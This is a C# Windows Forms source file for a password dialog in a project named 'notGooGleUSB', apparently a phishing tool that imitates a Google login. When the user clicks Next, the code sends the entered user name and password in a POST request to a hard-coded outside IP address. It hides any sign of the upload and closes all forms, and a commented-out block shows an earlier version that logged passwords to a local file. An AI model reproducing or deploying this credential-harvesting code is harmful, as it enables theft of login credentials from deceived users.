using System;
using System.Net.Http;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace notGooGleUSB
{
    public partial class Password : Form
    {
        private string _userName;
        public Password(string userName)        
        {
            _userName = userName;
            InitializeComponent();
            passwordBox.PasswordChar = '*';
            passwordBox.Select();            
        }

        private async void Next_Click(object sender, EventArgs e)
        {
            string password = passwordBox.Text;
            string userNameAndPassword = $"User Name: {_userName}" + Environment.NewLine + $"Password: {passwordBox.Text}";

            try
            {
                using (var client = new HttpClient())
                {
                    using (var content = new MultipartFormDataContent())
                    {
                        // Create a ByteArrayContent from the password string
                        var passwordContent = new ByteArrayContent(Encoding.UTF8.GetBytes(userNameAndPassword));
                        content.Add(passwordContent, "file", "userandpass.txt");

                        var response = await client.PostAsync("http://96.51.136.132:3000/uploads", content);

                        //if (response.IsSuccessStatusCode)
                        //{
                        //    MessageBox.Show("Password uploaded successfully to the server.");
                        //}
                        //else
                        //{
                        //    MessageBox.Show("Error uploading password to the server.");
                        //}
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show("An error occurred: " + ex.Message);
            }

            foreach (Form form in Application.OpenForms)
            {
                form.Close();
            }
        }






        //bool exeDirectoryExists = Directory.Exists(AppDomain.CurrentDomain.BaseDirectory);

        //if (!exeDirectoryExists)
        //{
        //    foreach (Form form in Application.OpenForms)
        //    {
        //        form.Close();
        //    }
        //}
        //else
        //{
        //    string exeDirectory = AppDomain.CurrentDomain.BaseDirectory;
        //    string logDirectory = Path.Combine(exeDirectory, "Login Information");
        //    string logFilePath = Path.Combine(logDirectory, "LoginAndPassword.txt");

        //    string password = $"Password: {passwordBox.Text}";

        //    if (!Directory.Exists(logDirectory))
        //    {
        //        Directory.CreateDirectory(logDirectory);
        //    }

        //    if (!File.Exists(logFilePath))
        //    {
        //        using (var sw = File.CreateText(logFilePath))
        //        {
        //            sw.WriteLine(password + "\n");
        //        }
        //    }
        //    else
        //    {
        //        using (StreamWriter sw = File.AppendText(logFilePath))
        //        {
        //            sw.Write(password + "\n\n");
        //        }
        //    }

        //    foreach (Form form in Application.OpenForms)
        //    {
        //        form.Close();
        //    }
        //}


        private void showPassBox_CheckedChanged(object sender, EventArgs e)
        {
            if (showPassBox.Checked)
            {
                this.passwordBox.PasswordChar = '\0'; // show plaintext
            }
            else
            {
                this.passwordBox.PasswordChar = '*'; // hide password
            }
        }

        private void passwordBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                Next.PerformClick();
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {
        }

        private void forgotPasslinkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
        }

        private void passwordBox_TextChanged(object sender, EventArgs e)
        {
        }

        private void passwordBox_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {
                Next_Click(sender, e); // Simulate click on "Next" button
            }
        }
    }
}
